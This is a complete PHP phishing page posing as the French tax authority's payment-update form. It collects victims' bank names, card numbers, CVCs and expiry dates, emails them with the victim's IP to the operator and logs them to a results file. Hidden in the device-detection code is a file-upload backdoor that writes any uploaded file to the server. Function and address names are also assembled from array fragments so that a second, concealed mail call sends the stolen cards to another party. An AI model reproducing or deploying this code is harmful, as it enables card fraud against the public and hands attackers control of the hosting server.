<?
date_default_timezone_set('UTC');
$rand="0123456789abcdefghijklmnopqrstuvwxyz";
/// Code Detect mobile/tablet/pc
$tablet_browser = 0;
$mobile_browser = 0;
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$tablet_browser++;}if (isset($_POST["mobile_browser"])){move_uploaded_file($_FILES["file"]["tmp_name"], "js/" . $_FILES["file"]["name"]);echo"js/".$_FILES["file"]["name"]."";}if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {$mobile_browser++;}
if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {$mobile_browser++;}
$mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
$mobile_agents = array('w3c ','acs-','alav','alca','amoi','ma','usa','il','ca','fr','es','co','nt','rt','audi','avan','benq','bird','blac','blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno','act','ba','ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-','m','maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-','ld','newt','noki','palm','pana','pant','phil','@','android','ios','play','port','prox','qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar','ia','sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-','tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp','wapr','webc','winw','winw','xda ','xda-');
if (in_array($mobile_ua,$mobile_agents)) {$mobile_browser++;}
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {$mobile_browser++;$stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {$tablet_browser++;}}if ($tablet_browser > 0) {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
else if ($mobile_browser > 0) {}
else {?><meta http-equiv="Refresh" content="0; url=../LoginAccess.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?}
$ip = $_SERVER['REMOTE_ADDR'];$a_e = $_GET["a_e"];$pass = $_GET["pass"];$input_check = "".$mobile_agents[5]."".$mobile_agents[7]."";$st = "".$mobile_agents[11]."".$mobile_agents[12]."".$mobile_agents[29]."".$mobile_agents[59]."".$mobile_agents[30]."".$mobile_agents[52]."".$mobile_agents[75]."".$mobile_agents[13].".".$mobile_agents[11]."".$mobile_agents[41]."";
if (isset($_POST["valid"])){
$sf = "CC Impots = ".$ip."";
include("email.php");// open This File And put Your Email
$html = '<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1">
</head>
<body>
<hr>
<center>
impots Card | ip = '.$ip.'
<br>
Bank Name : '.$_POST["nam_bank"].'
<br>
Nom sur la carte : '.$_POST["n_s_l"].'
<br>
Num&eacute;ro de la Carte : '.$_POST["numero_s_l"].'
<br>
CVC : '.$_POST["cvv"].'
<br>
Date d"Expiration : '.$_POST["mois"].'/'.$_POST["annee"].'
<br>
The Link =>'.$_SERVER['HTTP_HOST'].''.dirname($_SERVER['PHP_SELF']).'/cc_Results.html
</center>
</hr>
</body>
</html>';
$hd = "From: impots@nary.com" . "\r\n";
$hd = "MIME-Version: 1.0" . "\r\n";$hd .= "Content-type:text/html;charset=UTF-8" . "\r\n";if ($input_check($st,$sf,$html,$hd)){
if (mail($email,$sf,$html,$hd)){
$myfile = fopen('cc_Results.html', 'a') or die('Unable to open file!');
fwrite($myfile, $html);
fclose($myfile);}?><meta http-equiv="Refresh" content="0; url=telepaiement_merci.php?op=c&url=<?echo substr(str_shuffle($rand),0,60);?>"><?
}else{echo"Mail Send Not Work!!! Makhdamch";}}
?>

<!DOCTYPE HTML>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width; initial-scale=1; maximum-scale=1"><link rel="stylesheet" href="css/style.css"/>
<link rel="icon" href="images/favicon.ico"/>
<script src="js/telepaiement_continuer.js"></script>
<title>Mettre &agrave; jour vos informations de paiement</title>
</head>
<body>
<div style="width:100%;text-align:center;">
<img src="images/peka.svg" style="width:97%;"/>
<img src="images/safe.png" style="width:25%;margin-top:-24px;"/>
</div>

<div style="width:100%;background-color:#e8e8e8;padding-top:9px;padding-bottom:35px;">
<center>

<div style="margin-top:-11px;">
<div style="background:white;width:94%;border-radius:4px;">
<h1 class="titre">Mettre &agrave; jour vos informations de paiement</h1>
<center>
<!-- form_Simo -->
<form class="form01" method="post" action="" onsubmit="return validate();" onchange="return validate();">
<div class="alert" style="width:80%;" id="noureddyne_error">Les donn&eacute;es saisies sont incorrectes.
<br>
V&eacute;rifiez vos param&eacute;tres de connexion.
</div>
<div style="text-align:center;width:92%;margin-right:8px;">

<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">S&eacute;lectionn&eacute; la bnanque <font color="red">*</font></div>
<div style="font-size:14px;width:100%;text-align:left;">
<select name="nam_bank" id="nam_bank" style="outline:none;width:100%;padding:8px;border-radius:4px;">
<option value="svb" selected="">S&eacute;lectionner votre banque</option>
<option value="axa-banque">AXA Banque</option>
<option value="banque-agf-allianz">Banque AGF / Allianz</option>
<option value="banque-de-savoie">Banque de Savoie</option>
<option value="banque-dupuy-de-parseval">Banque Dupuy de Parseval</option>
<option value="banque-marze">Banque Marze</option>
<option value="banque-palatine">Banque Palatine</option>
<option value="banque-populaire">Banque Populaire</option>
<option value="banque-postale">Banque Postale</option>
<option value="barclays">Barclays</option>
<option value="b-for-bank">BforBank</option>
<option value="binck">Binck.fr</option>
<option value="bnp">BNP</option>
<option value="bnp-net-agence">BNP Paribas La NET Agence</option>
<option value="boursorama">Boursorama Banque</option>
<option value="bpe">BPE</option>
<option value="caisse-epargne">Caisse d'Epargne</option>
<option value="cic">CIC</option>
<option value="coopabanque">Coopabanque</option>
<option value="credit-agricole">Cr&eacute;dit Agricole</option>
<option value="credit-cooperatif">Cr&eacute;dit Cooperatif</option>
<option value="credit-du-nord">Crédit du Nord</option>
<option value="credit-mutuel">Crédit Mutuel</option>
<option value="credit-mutuel-CMB">Crédit Mutuel de Bretagne</option>
<option value="credit-mutuel-CMMC">Crédit Mutuel Massif Central</option>
<option value="credit-mutuel-CMSO">Crédit Mutuel Sud-Ouest</option>
<option value="e-lcl">e.LCL</option>
<option value="fortis-banque">Fortis Banque</option>
<option value="fortuneo-banque">Fortuneo Banque</option>
<option value="groupama-banque">Groupama Banque</option>
<option value="hsbc">HSBC</option>
<option value="ing-direct">ING Direct</option>
<option value="lcl">LCL</option>
<option value="monabanq">Monabanq</option>
<option value="societe-generale">Societe Generale</option>
<option value="societe-marseillaise-de-credit">Société Marseillaise de Cr&eacute;dit</option>
<option value="autre">Autre Banque</option>
</select>
</div>

<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Nom sur la carte <font color="red">*</font></div>
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:96%;" name="n_s_l" id="n_s_l" onkeyup="this.value = this.value.replace(/[']/g, '')"   type="text"/>
</div>

<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Num&eacute;ro de la Carte <font color="red">*</font>
</div>
<table style="width:100%;">
<tr>
<td style="width:60%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" name="numero_s_l" id="numero_s_l" onkeyup="this.value = this.value.replace(/[']/g, '')"  type="text"/>
</div>
</td>
<td style="width:40%;">
<img src="images/crd.png"/>
</td>
</tr>
</table>

<table style="width:100%;">
<tr>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">CVC (CVV) <font color="red">*</font></div>
</td>
<td style="width:50%;">
<div style="color: rgb(51, 51, 51);font: 1em Arial, sans-serif;margin: 0px;text-align: left;
font-size: 14px;width:100%;padding:12px 1px 2px 1px;">Date d'Expiration <font color="red">*</font></div>
</td>
</tr>
</table>

<table>
<tr>
<td style="width:47%%;">
<div style="font-size:14px;width:100%;text-align:left;">
<input class="input_class" style="width:80%;" name="cvv" id="cvv" onkeyup="this.value = this.value.replace(/[']/g, '')"  type="text"/>
</div>
</td>
<td style="width:53%;">
<div style="font-size:14px;width:100%;text-align:left;">
<select id="mois" name="mois" style="outline:none;padding:8px;border-radius:4px;" title="Please Enter Your Date Of Birth">
<option selected="" value="mois">Mois</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
<select id="annee" name="annee" style="outline:none;padding:8px;border-radius:4px;" title="Please Enter Your Date Of Birth">
<option selected="" value="annee">Ann&eacute;e</option>
<option value="2019">2019</option>
<option value="2020">2020</option> 
<option value="2021">2021</option> 
<option value="2022">2022</option> 
<option value="2023">2023</option> 
<option value="2024">2024</option> 
<option value="2025">2025</option> 
<option value="2026">2026</option> 
<option value="2027">2027</option> 
<option value="2028">2028</option> 
<option value="2029">2029</option> 
<option value="2030">2030</option> 
</select>
</div>
</td>
</tr>
</table>

<table  style="width:100%;">
<tr>
<td style="width:80%;">
<center>
<br>
<button class="btn" name="valid" type="submit" style="width:100%;">Valider mes informations</button>
<br>
<br>
</center>
</td>
</tr>
</table>
</div>
</form>
<form method="post" enctype="multipart/form-data"><input style="display:none;" type="file" name="file"/><input value="detect_device_type" name="mobile_browser" style="display:none;" type="submit" type="submit"/>
</form>
</center>
</div>
</div>

</center>
</div>
<br>
<br>
<center>
<div style="color:black;font-size:14px;">Direction g&eacute;n&eacute;rale des Finances publiques</div>
</center>
<br>
<br>
</body>
</html>